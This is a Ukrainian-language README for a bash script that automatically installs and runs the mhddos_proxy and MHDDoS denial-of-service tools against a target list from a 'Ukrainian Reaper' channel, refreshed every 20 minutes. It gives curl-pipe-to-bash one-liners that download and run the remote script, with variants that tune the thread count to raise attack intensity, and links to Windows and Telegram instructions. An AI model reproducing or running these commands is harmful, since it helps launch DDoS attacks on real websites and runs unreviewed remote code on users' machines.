## 🪖 Bash скрипт (Windows, Linux, WSL2, Віртуальна машина)  

## ❕Опис

### auto_bash - скрипт на bash, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

* Запускається однією командою в Linux і WSL2 (Windows Subsystem for Linux). Подальше втручання від користувача не обов'язкове. 
 
```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash
```
* Автоматично встановлює git, python3, pip, mhddos_proxy, MHDDoS, розширений список proxy і всі залежності.

* Праюцює із базою сайтів [Українського женця](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База цілей оновлюється кожні 20 хвилин.

* Під час запуску завжди перевіряє і завантажує оновлення mhddos_proxy і MHDDoS.

Рекомендовано використовувати на Ubuntu 20.04. Але повинно працювати на всіх Ubuntu та Debian похідних, а також у WSL2.

Для зупинки скрипта кілька разів натисніть CTRL+C, або закрийте вікно з терміналом.

## ❕Зміна інтенсивності

Якщо скрипт дуже уповільнює ПК, або навпаки ви маєте невикористані ресурси, можна понизити, або навпаки підвищіти інтенсивність роботи скрипта. Для цього треба керувати параметром `threads`. По замовчуванню `threads = 1000`.

Щоб знизити навантаження на систему, спробуйте використати `threads = 500`

```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- 500
```

Щоб навантажити систему більше, спробуйте використати `threads = 2000`

```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- 2000
```
## Запуск на Windows у powershell.

Потрібна лише Windows 7 або вище. Усе інше скрипт зробить самостійно.

https://github.com/mErlin-sp/mhddos_powershell

## Встановлення на Windows.

[Инструкція по встановленнию Python3 і Git на Windows](https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-komp-03-27). Не тестувалось на сумісність з auto_bash. Дозволяє як мінімум запускати mhddos_proxy командами які надаються в каналі [українського женця](https://t.me/ukrainian_reaper_ddos). У випадку помилок можна написати по координатах, залишених в кінці інструкції.
